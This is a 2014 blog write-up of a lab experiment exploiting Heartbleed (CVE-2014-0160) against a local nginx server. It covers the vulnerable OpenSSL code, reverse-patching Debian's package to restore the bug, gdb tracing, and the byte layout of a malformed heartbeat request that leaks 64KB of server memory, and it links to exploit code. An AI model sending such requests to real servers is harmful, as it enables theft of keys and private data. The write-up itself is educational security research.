---
layout: post
title:  "Exploiting CVE-2014-0160, also known as Heartbleed"
date:   2014-08-23 13:31:48
tags: [linux, security, vulnerabilities]
published: yes
pygments: true
toc: true
categories: [Technical]
---

This post presents a proof of concept of an exploit for the Heartbleed bug.
With the exploit I attempted to steal the private keys from a local instance 
using a vulnerable version of OpenSSL. I was unsuccessful, but it has proven 
a very interesting experiment anyway.

The bug
=======

Heartbleed, CVE-2014-0160 in the Common Vulnerabilities and Exposures system,
is a bug which affects OpenSSL library allowing an attacker to retrieve a 64KB
chunk of memory from the address space of a process which is using libssl.
The bug resides in the implementation of one of the features of the TLS protocol, 
the TLS Heartbeat Extension, and affects OpenSSL from version 1.0.1 to 1.0.1f included.

The bug lies in `ssl/t1_lib.c` in function `tls1_process_heartbeat`.
A heartbeat request is a way to check if the remote end of the connection is still
alive. The client sends a request with a custom payload and the server is supposed
to echo back the same data.

{% highlight c  %}
/* Allocate memory for the response, size is 1 bytes
 * message type, plus 2 bytes payload length, plus
 * payload, plus padding
 */
buffer = OPENSSL_malloc(1 + 2 + payload + padding);
bp = buffer;

/* Enter response type, length and copy payload */
*bp++ = TLS1_HB_RESPONSE;
s2n(payload, bp);
 memcpy(bp, pl, payload);
bp += payload;

/* Random padding */
RAND_pseudo_bytes(bp, padding);
{% endhighlight %}

`payload` is the length of the payload of the heartbeat request sent by the client,
which is read directly from the incoming message. `pl` points to an area in memory
where the payload itself is stored. The bug comes from a missing bounds check when
echoing back the data of the heartbeat message: the payload length advertised by
the client is never checked against the actual
length of the buffer received. A client might specify a length of N bytes, but
send instead only M bytes, with M < N. When sending back the response,
the server copies `payload` bytes from the buffer pointed by `pl`. So, in principle a client can
send a heartbeat message with an arbitrary length value, and it will get back a chunk of memory
from the server address space. The `payload` field is actually 16 bits long,
so the maximum length is 64KB. The bug can be easily fixed by checking that the advertised
length of the payload matches the actual length. A <a href="http://git.openssl.org/gitweb/?p=openssl.git;a=commit;h=731f431497f463f3a2a97236fe0187b11c44aead" target="_blank">patch</a>
was released soon after the disclosure of the bug.

Those 64KB leaked by the server might potentially contain everything which lives 
in the process address space.
Of course the worst case scenario is a server leaking a chunk of memory which
contains the private keys used to negotiate the encrypted connection. Soon after the bug was
disclosed, Cloudflare announced the Heartbleed Challange, asking the community to
steal the private keys from a nginx instance running on their servers. According
to their very early experiments, they thought <a href="https://blog.cloudflare.com/answering-the-critical-question-can-you-get-private-ssl-keys-using-heartbleed/" target="_blank">
this would never happen</a>,
but it turned out they were wrong. In fact, at least four people were able to steal
the private keys exploiting Heartbleed, Fedor Indutny being the first one.



openssl package
===============
Following Cloudflare's example, I decided to try to obtain the private keys from my
own instance. I am running Debian Wheezy 7.1 and, according to apt, the openssl 
version I have
installed on my machine is `1.0.1e`.

{% highlight text  %}
$ sudo apt-cache policy openssl
openssl:
  Installed: 1.0.1e-2+deb7u14
  Candidate: 1.0.1e-2+deb7u14
  Version table:
 *** 1.0.1e-2+deb7u14 0
        500 http://security.debian.org/ wheezy/updates/main i386 Packages
        100 /var/lib/dpkg/status
     1.0.1e-2+deb7u13 0
        500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
{% endhighlight %}

At a first glance, this might appear to be a vulnerable release, but the output
of openssl version shows that the package has been compiled in early 2015, 
well after the disclosure of the bug.

{% highlight text  %}
$ openssl version -a
OpenSSL 1.0.1e 11 Feb 2013
built on: Thu Jan  8 21:47:50 UTC 2015
platform: debian-i386-i686/cmov
options:  bn(64,32) rc4(8x,mmx) des(ptr,risc1,16,long) blowfish(idx)
[...]
{% endhighlight %}

The changelog for `openssl_1.0.1e-2+deb7u14` shows that on April the 7th,
Heartbleed was fixed incrementing the release to deb7u5.

{% highlight text  %}
openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high

  * Non-maintainer upload by the Security Team.
  * Add CVE-2014-0160.patch patch.
    CVE-2014-0160: Fix TLS/DTLS heartbeat information disclosure.
    A missing bounds check in the handling of the TLS heartbeat extension
    can be used to reveal up to 64k of memory to a connected client or
    server.

 -- Salvatore Bonaccorso <carnil@debian.org>  Mon, 07 Apr 2014 22:26:55 +0200
{% endhighlight %}

The openssl version installed on my machine is therefore not vulnerable. In order to
restore the bug, the package must be rebuilt without applying the fix. The easiest
way to do so is via a reverse patch, since by default apt applies
automatically all the patches included in the package after having fetched the sources
via `apt-get source`.

{% highlight text  %}
$ apt-get source openssl
[...]
cd openssl-1.0.1e/debian/patches/
interdiff CVE-2014-0160.patch /dev/null > hb_reversed.patch
mv hb_reversed.patch ../../
cd ../..
patch -p1 < hb_reversed.patch
{% endhighlight %}

The changes must be committed with `dpkg-source --commit`
(it is not possible to compile the new package until then). This will
create the "official" patch out of the differences in the codebase. When committing
the changes, a description of the fix must be provided, which will eventually be appended
on top of the .patch file. `dch -i`  (part of devscripts in Debian) opens an 
editor where to add a new changelog entry: the version that appears there
 will be the one displayed by apt, `1.0.1e-2+deb7u14.1` in my case.
The package can be finally built with  `dpkg-buildpackage -us -uc`.

Once done, `openssl_1.0.1e-2+deb7u14.1_i386.deb` and related packages will be
available. Heartbleed vulnerability comes from libssl1.0.0 and the package
that should be installed is `libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb`.

{% highlight text  %}
$ sudo dpkg -i libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb
(Reading database ... 203151 files and directories currently installed.)
Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb) ...
Unpacking replacement libssl1.0.0:i386 ...
Setting up libssl1.0.0:i386 (1.0.1e-2+deb7u14.1) ...

$ sudo apt-cache policy libssl1.0.0
libssl1.0.0:
  Installed: 1.0.1e-2+deb7u14.1
  Candidate: 1.0.1e-2+deb7u14.1
  Version table:
 *** 1.0.1e-2+deb7u14.1 0
        100 /var/lib/dpkg/status
     1.0.1e-2+deb7u14 0
        500 http://security.debian.org/ wheezy/updates/main i386 Packages
     1.0.1e-2+deb7u13 0
        500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
{% endhighlight %}

It is possible to revert to the old clean package by passing a specific version to
apt.

{% highlight text  %}
$ sudo apt-get install libssl1.0.0=1.0.1e-2+deb7u14
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages will be DOWNGRADED:
  libssl1.0.0
0 upgraded, 0 newly installed, 1 downgraded, 0 to remove and 269 not upgraded.
Need to get 0 B/3,037 kB of archives.
After this operation, 52.2 kB disk space will be freed.
Do you want to continue [Y/n]? Y
Preconfiguring packages ...
dpkg: warning: downgrading libssl1.0.0:i386 from 1.0.1e-2+deb7u14.1 to 1.0.1e-2+deb7u14
(Reading database ... 203151 files and directories currently installed.)
Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using .../libssl1.0.0_1.0.1e-2+deb7u14_i386.deb) ...
Unpacking replacement libssl1.0.0:i386 ...
Setting up libssl1.0.0:i386 (1.0.1e-2+deb7u14) ...
{% endhighlight %}

nginx installation
==================
nginx can be configured to enable HTTPS connections by simply adding the following
`server` entry in the configuration file within the `http` section, making sure it
does not clash with other `server` definitions included from `/etc/nginx/sites-enabled`.
The default configuration file is `/etc/nginx/nginx.conf`.

{% highlight text  %}
server {
    listen              443 ssl;
    server_name         localhost;
    ssl_certificate     <path_to_ssl_cert>;
    ssl_certificate_key <path_to_private_key>;
    location / {
            root   /usr/share/nginx/www;
            index  index.html index.htm;
    }
}
{% endhighlight %}

Heartbeat request
=================
The very first step to exploit Heartbleed is to send a proper heartbeat request 
to the nginx instance, making sure the server echoes back the payload of the message.

{% highlight python %}
0x18                    # Type: Heartbeat
0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2)
0x00 0x17               # Record length, size of the heartbeat message
0x01                    # heartbeat message type: request
0x00 0x04               # Payload size
0xDE 0xAD 0xBE 0xEF     # Payload
0xAB 0x9A 0xC1 0x97     # 16 bytes random padding
0xDA 0xC8 0xFC 0x92     #
0x9E 0xEE 0xD4 0x3B     #
0x93 0xDD 0x7D 0xB5     #
{% endhighlight %}

It turned out to be a bit more complicated than that. The heartbeat message is sent
to the server but no response whatsoever is returned. The picture below shows
that Wireshark decodes properly the SSL record, which means the message can
be considered as well-formatted.

<p align="center">
<a id="single_image" href="/img/heartbleed/hb_good_request_detail.png">
<img  src="../img/heartbleed/hb_good_request_detail.png" alt=""/></a>
</p>

Even if the SSL handshake is not terminated, as shown by the traffic dump,
the server should reply anyway with a heartbeat response message. After several
unsuccessful attempts, I decided to go more in depth by following step by
step the execution on the server side.

<p align="center">
<a id="single_image" href="/img/heartbleed/hb_good_request.png">
<img src="/img/heartbleed/hb_good_request.png" alt=""/></a>
</p>


Executing libssl under gdb
=========================

In order to execute any piece of code under a debugger, two requirements are
essential: debug symbols and source code. The former can be obtained under Debian
with `-dbg` packages. However, if the original binary has been compiled with optimizations
enabled, a single-step execution will not result in a clean flow at the source 
code level: associating assembly instructions to C code becomes difficult due to 
instruction reordering, loop unrolling, inlining, etc. The `-dbg` package might be 
enough to generate a meaningful stack trace when the program crashes, but for single
step execution `libssl` must be re-compiled with debug symbols and without optimizations. 
`CFLAGS` used by dpkg are set in `/etc/dpkg/buildflags.conf`. The following should
do the job:

{% highlight text  %}
SET CFLAGS -g -O0 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security
{% endhighlight %}

A further simplification which makes debugging easier is
to add the following directive in `/etc/nginx/nginx.conf` in order to spawn
only one worker thread for serving incoming requests:

{% highlight text  %}
worker_processes 1;
{% endhighlight %}
After restarting nginx, gdb can be attached to the worker process.

{% highlight text  %}
$ ps aux | grep nginx
root      5210  0.0  0.0  11980   960 ?        Ss   10:15   0:00 nginx: master process /usr/sbin/nginx
www-data  5211  0.0  0.0  12144  1356 ?        S    10:15   0:00 nginx: worker process
marco     5258  0.0  0.0   3548   804 pts/0    S+   10:15   0:00 grep nginx
$ sudo gdb
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
(gdb) attach 5211
{% endhighlight %}

gdb tries to load the symbols of all the shared objects mapped in the address space of the process,
including libssl.so.1.0.0, which should result in the following messages:

{% highlight text  %}
Reading symbols from /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0...done.
Loaded symbols for /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0
{% endhighlight %}

gdb should also be pointed to the location of the source code with the `directory`
command.

{% highlight text  %}
(gdb) directory <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl
Source directories searched: <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl:$cdir:$cwd
{% endhighlight %}

A breakpoint on `tls1_process_heartbeat` can be set and the execution resumed.

{% highlight text  %}
(gdb) break tls1_process_heartbeat
Breakpoint 1 at 0xb76c29d4: file t1_lib.c, line 2579.
(gdb) c
Continuing.
{% endhighlight %}

Now, upon receiving a heartbeat message, the code will hit the breakpoint, allowing
step by step execution.


{% highlight text  %}
Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
(gdb) s
2582        unsigned int padding = 16; /* Use minimum padding */
(gdb) s
2585        hbtype = *p++;
(gdb) s
2586        n2s(p, payload);
(gdb)
2587        pl = p;
(gdb)
{% endhighlight %}

The control path which explains why a heartbeat response is not echoed back to the
client leads to function `buffer_write` in `bf_buff.c`.

{% highlight text  %}
Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
[...]
2614            r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
(gdb) s
ssl3_write_bytes (s=0x9910a58, type=24, buf_=0x99609a8, len=23) at s3_pkt.c:584
[...]
611         i=do_ssl3_write(s, type, &(buf[tot]), nw, 0);
(gdb) s
    do_ssl3_write (s=0x9910a58, type=24, buf=0x99609a8 "\002", len=23, create_empty_fragment=0) at s3_pkt.c:638
    [...]
    856     return ssl3_write_pending(s,type,buf,len);
    (gdb) s
    ssl3_write_pending (s=0x9910a58, type=24, buf=0x99609a8 "\002", len=23) at s3_pkt.c:866
        [...]
        884             i=BIO_write(s->wbio,
        (gdb) s
            BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:227
            [...]
            241     if (!b->init)
            (gdb)
            247     i=b->method->bwrite(b,in,inl);
            (gdb) s
                buffer_write (b=0x99128b0, in=0x995b8cb "\030\003\002", inl=28) at bf_buff.c:199
                [...]
                210     if (i >= inl)
                (gdb)
                212         memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,inl);
                (gdb)
                213         ctx->obuf_len+=inl;
                (gdb)
                214         return(num+inl);
                (gdb)
                268     }
                (gdb)
            BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:249
            249     if (i > 0) b->num_write+=(unsigned long)i;
{% endhighlight %}

The `buffer_write` function is defined in `crypto/bio/bf_buf.c`.

{% highlight c  %}
static int buffer_write(BIO *b, const char *in, int inl)
    {
    int i,num=0;
    BIO_F_BUFFER_CTX *ctx;

    if ((in == NULL) || (inl <= 0)) return(0);
    ctx=(BIO_F_BUFFER_CTX *)b->ptr;
    if ((ctx == NULL) || (b->next_bio == NULL)) return(0);

    BIO_clear_retry_flags(b);
start:
    i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
    /* add to buffer and return */
    if (i >= inl)
            {
            memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,inl);
            ctx->obuf_len+=inl;
            return(num+inl);
            }
    /* else */
    /* stuff already in buffer, so add to it first, then flush */
    if (ctx->obuf_len != 0)
            {
            if (i > 0) /* lets fill it up if we can */
                    {
                    memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,i);
                    in+=i;
                    inl-=i;
                    num+=i;
                    ctx->obuf_len+=i;
                    }
            /* we now have a full buffer needing flushing */
            for (;;)
                    {
                    i=BIO_write(b->next_bio,&(ctx->obuf[ctx->obuf_off]),
                            ctx->obuf_len);
                    if (i <= 0)
                            {
                            BIO_copy_next_retry(b);

                            if (i < 0) return((num > 0)?num:i);
                            if (i == 0) return(num);
                            }
                    ctx->obuf_off+=i;
                    ctx->obuf_len-=i;
                    if (ctx->obuf_len == 0) break;
                    }
            }
    /* we only get here if the buffer has been flushed and we
     * still have stuff to write */
    ctx->obuf_off=0;

    /* we now have inl bytes to write */
        while (inl >= ctx->obuf_size)
                {
                i=BIO_write(b->next_bio,in,inl);
                if (i <= 0)
                        {
                        BIO_copy_next_retry(b);
                        if (i < 0) return((num > 0)?num:i);
                        if (i == 0) return(num);
                        }
                num+=i;
                in+=i;
                inl-=i;
                if (inl == 0) return(num);
                }

        /* copy the rest into the buffer since we have only a small
         * amount left */
        goto start;
        }
{% endhighlight %}

This function copies the data passed as argument with pointer `*in` into
the buffer pointed by the BIO object `*b`. The decision whether to flush or not
the buffer through the socket is taken based on the size of the data with respect to
the size of the BIO buffer. If the former is smaller than the latter, the buffer is
not flushed. In this case the heartbeat response message is 28 bytes and the buffer
is 4KB, which prevents the data from being flushed.

{% highlight text  %}
(gdb) print i
$1 = 4096
(gdb) print inl
$2 = 28
{% endhighlight %}

What happens if the size of the heartbeat message is bigger than the buffer, say 5000
bytes? I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
to send a well-formed heartbeat request while tracing `buffer_write`.

{% highlight text  %}
    (gdb)
    247     i=b->method->bwrite(b,in,inl);
    (gdb) s
    buffer_write (b=0x9960ae8, in=0x995b8cb "[content of the buffer, omitted]"..., inl=5000) at bf_buff.c:199
    199     int i,num=0;
    (gdb) print inl
    $3 = 5000
    (gdb) n
    202     if ((in == NULL) || (inl <= 0)) return(0);
    (gdb)
    203     ctx=(BIO_F_BUFFER_CTX *)b->ptr;
    (gdb)
    204     if ((ctx == NULL) || (b->next_bio == NULL)) return(0);
    (gdb)
    206     BIO_clear_retry_flags(b);
    (gdb)
    208     i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
    (gdb)
    210     if (i >= inl)
    (gdb)
    218     if (ctx->obuf_len != 0)
    (gdb)
    247     ctx->obuf_off=0;
    (gdb) print ctx->obuf_len
    $4 = 0
    (gdb) n
    250     while (inl >= ctx->obuf_size)
    (gdb)
    252         i=BIO_write(b->next_bio,in,inl);
    (gdb)
    253         if (i <= 0)
    (gdb)
    259         num+=i;
    (gdb)
    260         in+=i;
    (gdb)
    261         inl-=i;
    (gdb)
    262         if (inl == 0) return(num);
    (gdb)
    268     }
    (gdb)
    BIO_write (b=0x9960ae8, in=0x995b8cb, inl=5000) at bio_lib.c:249
    249     if (i > 0) b->num_write+=(unsigned long)i;
    (gdb) print i
    $5 = 5000
{% endhighlight %}

The loop at line 250 writes 5000 bytes in the output buffer, which is then flushed through
the socket; the client receives a well-formed heartbeat response with a payload
that matches the data carried in the request message.

<p align="center">
<a id="single_image" href="/img/heartbleed/hb_working_response.png">
<img src="/img/heartbleed/hb_working_response.png" alt=""/></a>
</p>


Heartbleed request
=========================

A malformed heartbeat request features a payload size which does not match the actual
length of the data carried inside the message.

{% highlight python %}
0x18                    # Type: Heartbeat
0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2)
0x00 0x03               # Record length, size of the heartbeat message
0x01                    # heartbeat message type: request
0xFF 0xFF               # Payload size, does not match the actual size of the payload
                        # No payload
{% endhighlight %}

Due to the lack of checks on the payload size, the server returns 65536 bytes
copied from the address space of the process: <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
can be adapted to send a malformed request. The heartbeat response message contains 65536 bytes
of payload, 16 bytes of padding and 4 bytes of header, 65556 in total.


{% highlight text  %}
$ ./send_heartbleed
Initializing new connection...
Connecting...
Connected!
resplen:  65556
{% endhighlight %}

Scanning leaked memory
=============================

After setting up my local nginx instance with a newly generated private/public
key pair, I tried to look for a prime factor that would divide `n` (part of the
public key) in the memory leaked by the server using  <a href="https://github.com/marcoguerri/heartbleed/blob/master/exploit.c" target="_blank">
exploit.c</a>.  With `ulimit`, I capped the maximum size of
the virtual address space of the process at 256MB and I fired up 8 parallel
instances of the script. After ~3M requests, I could not find any trace of the
private keys.



[jekyll-gh]: https://github.com/mojombo/jekyll
[jekyll]:    http://jekyllrb.com
